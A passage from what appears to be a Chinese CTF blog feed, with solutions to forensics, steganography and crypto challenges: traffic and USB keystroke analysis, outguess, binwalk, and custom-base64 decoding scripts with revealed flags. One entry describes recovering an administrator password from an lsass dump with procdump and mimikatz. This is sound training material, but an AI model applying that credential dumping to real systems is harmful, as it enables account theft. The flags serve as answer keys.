class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[84, 104, 97, 116, 32, 119, 97, 115, 32, 102, 97, 115, 116, 33, 32, 84, 104, 101, 32, 102, 108, 97, 103, 32, 105, 115, 58, 32, 68, 68, 67, 84, 70, 123, 57, 50, 50, 97, 98, 57, 57, 55, 52, 97, 52, 55, 99, 100, 51, 50, 50, 99, 102, 52, 51, 98, 53, 48, 54, 49, 48, 102, 97, 101, 97, 53, 125]</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>ASCII码转换为字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><br></pre></td></tr></table></figure><h3 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h3><p>流量分析。导出http，许多图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady/CTF$ exiftool * | grep <span class="string">&quot;flag&quot;</span></span><br><span class="line">XP Comment                      : 恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f</span><br></pre></td></tr></table></figure><p>另一个在tcp流中找到。</p><h3 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h3><p>As we known, Alison is a pretty girl。</p><p>在boki.jpg中发现zip，用binwalk命令分离<br>暴力破解后得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09</span><br></pre></td></tr></table></figure><p>base64 decode后得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killerqueen</span><br></pre></td></tr></table></figure><p>jljy.jpg，outguess隐写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -k &quot;killerqueen&quot; -r jljy.jpg out.txt</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h3><p>流量包，导出http对象。其中有一个<code>lsass.dmp</code>，分析流量发现使用了。procdump.exe这个工具。该工具一般用来抓取windows的lsass进程中的用户明文密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略。</span><br></pre></td></tr></table></figure><p>获取里面的系统administrator密码，使用<code>mimikatz</code>。</p><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>其中一个文件binwalk分析。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ binwalk -e /home/steady/桌面/steady/key.ftm</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">34741</span>         <span class="number">0x87B5</span>          Zip archive data, at least v2<span class="number">.0</span> to extract, compressed size: <span class="number">4478</span>, uncompressed size: <span class="number">37254</span>, name: key.pcap</span><br><span class="line"><span class="number">39347</span>         <span class="number">0x99B3</span>          End of Zip archive, footer length: <span class="number">22</span></span><br><span class="line"><span class="number">40037</span>         <span class="number">0x9C65</span>          Zip archive data, at least v2<span class="number">.0</span> to extract, compressed size: <span class="number">4478</span>, uncompressed size: <span class="number">37254</span>, name: key.pcap</span><br><span class="line"><span class="number">44643</span>         <span class="number">0xAE63</span>          End of Zip archive, footer length: <span class="number">22</span></span><br></pre></td></tr></table></figure><p>提示usb，就是usb流量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r C:\Users\12521\Desktop\key.pcap -T fields -e usb.capdata &gt;flag.txt</span><br></pre></td></tr></table></figure><p>使用脚本提取信息，有冒号–<code>int(line[6:8]</code>，如果没有冒号，<code>int(line[4:6])</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    nums.append(int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;output :\n&#x27;</span> + output</span><br></pre></td></tr></table></figure><p>得到 KEYXINAN<br>维吉尼亚密码：key=<code>XINAN</code>， message = <code>ci&#123;v3erf_0tygidv2_fc0&#125;</code></p><p>栅栏密码解密。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Crypto刷题1</title>
      <link href="2019/05/13/CTF-Crypto%E5%88%B7%E9%A2%982/"/>
      <url>2019/05/13/CTF-Crypto%E5%88%B7%E9%A2%982/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-密码题"><a href="#CTF-密码题" class="headerlink" title="CTF-密码题"></a>CTF-密码题</h1><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><h3 id="this-base64"><a href="#this-base64" class="headerlink" title="this base64?"></a>this base64?</h3><p>给了一个新的编码表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">码表：</span><br><span class="line"><span class="string">&#x27;JKLMNOxyUVzABCDEFGH789PQIabcdefghijklmWXYZ0123456RSTnopqrstuvw+/=&#x27;</span></span><br><span class="line">chipertext:</span><br><span class="line">FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">dict=&#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>,<span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;l&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;m&#x27;</span>, <span class="number">38</span>: <span class="string">&#x27;W&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;X&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="number">41</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="number">42</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;3&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;4&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;5&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;6&#x27;</span>, <span class="number">49</span>: <span class="string">&#x27;R&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;S&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;T&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;n&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;o&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;p&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;q&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;r&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;s&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;t&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;u&#x27;</span>, <span class="number">60</span>: <span class="string">&#x27;v&#x27;</span>, <span class="number">61</span>: <span class="string">&#x27;w&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;+&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;/&#x27;</span>, <span class="number">64</span>: <span class="string">&#x27;=&#x27;</span>&#125;</span><br><span class="line">base64_list = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">cipher=<span class="string">&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(dict[j]==cipher[i]):</span><br><span class="line">            res+=base64_list[j]</span><br><span class="line">flag=base64.b64decode(res)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="base一条龙"><a href="#base一条龙" class="headerlink" title="base一条龙"></a>base一条龙</h3><p>给了一串base64，解密给出一堆乱码但是开头是RAR，直接写入文件。打开压缩包拿到一堆base64。尝试base64隐写，拿到一个网站，下载一个压缩包。得到一串类似base64的东西，接着尝试各种base密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(str(base64.b64decode(steady_str)))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;Rar!\x1a\x07\x01\x00\xf3\xe1\x82\xeb\x0b\x01\x05\x07\x00\x06\x01\x01\x80\x80\x80\x00\x98\xa2;A&amp;\x02\x03\x0b\xbd\x92\x00\x04\xf8\xe4\x00 I\xf8\xd1C\x80\x03\x00\x08steg.txt\n\x03\x02U\xe2\xb9w\xa0\xf3\xd5\x01\xcc\xa69\t@\x04344?5\x04^\xf3\xe5_\ri\xa4\xb5\xeb\xe1\xbcr\xb2b\x94\xaa\xb3\x15VR\x89L]&amp;\xe6\xd4M\xea\xce\x92\xb7\xc3\xfe\xda\xf0\xcc@\x12&lt;\x08M\xb9RMo\xe3\x99x\x91$\x01`\x0b\x00/\x9a\x00\x80@6\r\x8f\x1b\xbb\x00]\x12\t\xf9.\x1d\xfc~_9\xbfx\xbf\x8f\xdb\xfa\x92\xca\xbe\xd2p\xe5;\xb5\xdb\xdfE\xe3\xc3\x7f\x8f_\x8f\x0b\xbe\xd2Q6\xcf\x1e\xce\x9el\xbb\xa2\xf1\xa6\xac*\xdbl\xd9x\xc0\xcao\xde\xd2\xf7h\xc0W||\xb9\xed?\xdc\xfd\x9f\x1f\x8f\xe8\xeeHlC\xf4\xa7S[\x99\x03\xa9\xc0xq-|1;\x0b\xb9\xc9`C\xa1\xdao6&lt;N\x02\x99\xc7\x93%\xed(xzph\xac\x90\x1d\xfb\xb1\x9a5\xecw\xa7\x18\xcd0u\x03\x11D\xd3\xab^\xbb\x89`\xc0\xee\xc3\x03\xa1\xe5\xb0y1\xde\xdde\xd4r7\x07v\xcc\x85\x84\xb2\x03\xf7\</span></span><br></pre></td></tr></table></figure><p>拿到RAR</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">steady_str=<span class="string">&quot;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&quot;</span></span><br><span class="line">f=open(<span class="string">&#x27;flag.rar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="comment">#注意这里是以二进制的形式打开文件，才能够写入文件。</span></span><br><span class="line">f.write(str(base64.b64decode(steady_str)))</span><br></pre></td></tr></table></figure><p>base64隐写解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 